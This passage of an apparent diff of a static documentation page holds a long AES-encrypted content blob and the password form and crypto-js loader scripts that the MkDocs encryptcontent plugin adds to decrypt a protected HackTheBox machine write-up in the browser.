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</div>
+<div id="mkdocs-decrypted-content">
+    <form id="mkdocs-decrypt-form" class="md-content__inner md-typeset">
+        <h1>This content is protected with AES encryption. </h1>
+        <p>Contact your administrator for access to this page.</p>
+        <input class="md-input" type="password" id="mkdocs-content-password" placeholder="Password" />
+        
+        <p id="mkdocs-decrypt-msg"></p>
+    </form>
+</div>
+
+<script type="text/javascript">
+var encryptcontent_id = "encryptcontent_2";
+var encryptcontent_path = "write-up/HackTheBox/Machines/Bizness/";
+var decryption_failure_message = "Invalid password.";
+var encryptcontent_keystore = ["vY9gcKiDlsqDK55tXVf+8A==;xIB2X4hmXkrUH82/fytV1K4XX2tDAfGooBnFlJrh845HHlOs78E1we6Ncew7Vj9ZZWnNd8lIhfTcvb5qIuOHPNF4Vv4adXODVh4WG+cOqu3R9zNYCBJMalDrhtkqVTWl;bON44kFHPcdFeRgHQiFuyw=="];
+var encryptcontent_obfuscate = 0;
+
+</script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/core.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/enc-base64.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/cipher-core.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/sha256.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/hmac.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/pbkdf2.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/aes.js"></script>
+<script type="text/javascript" src="../../../assets/javascripts/decrypt-contents.js" defer></script>
 
 
 
